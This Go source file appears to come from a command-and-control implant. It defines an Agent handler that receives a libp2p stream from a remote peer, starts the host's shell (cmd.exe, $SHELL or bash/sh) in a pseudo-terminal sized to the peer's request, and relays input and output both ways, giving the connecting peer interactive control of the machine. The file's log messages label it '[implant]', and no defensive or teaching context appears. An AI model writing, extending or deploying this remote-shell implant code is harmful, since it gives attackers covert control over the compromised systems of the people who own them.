package core

import (
	"encoding/binary"
	"io"
	"log"
	"os"
	"os/exec"
	"runtime"

	"github.com/creack/pty"
	"github.com/libp2p/go-libp2p/core/network"
)

func (a *Agent) handleShellStream(s network.Stream) {
	defer s.Close()
	remotePeer := s.Conn().RemotePeer()

	var winsize pty.Winsize
	if err := binary.Read(s, binary.LittleEndian, &winsize.Rows); err != nil {
		log.Printf("[implant] read shell rows: %v", err)
		return
	}
	if err := binary.Read(s, binary.LittleEndian, &winsize.Cols); err != nil {
		log.Printf("[implant] read shell cols: %v", err)
		return
	}
	if winsize.Rows < 10 || winsize.Cols < 10 {
		winsize.Rows = 30
		winsize.Cols = 120
	}

	shell := shellPath()
	cmd := exec.Command(shell)
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")

	f, err := pty.StartWithSize(cmd, &winsize)
	if err != nil {
		log.Printf("[implant] pty start: %v", err)
		return
	}
	defer f.Close()

	go func() {
		io.Copy(f, s)
	}()
	io.Copy(s, f)

	log.Printf("[implant] shell session ended for %s", remotePeer.String())
}

func shellPath() string {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe"
	default:
		if sh, ok := os.LookupEnv("SHELL"); ok && sh != "" {
			return sh
		}
		for _, candidate := range []string{"/bin/bash", "/bin/sh"} {
			if _, err := os.Stat(candidate); err == nil {
				return candidate
			}
		}
		return "/bin/sh"
	}
}
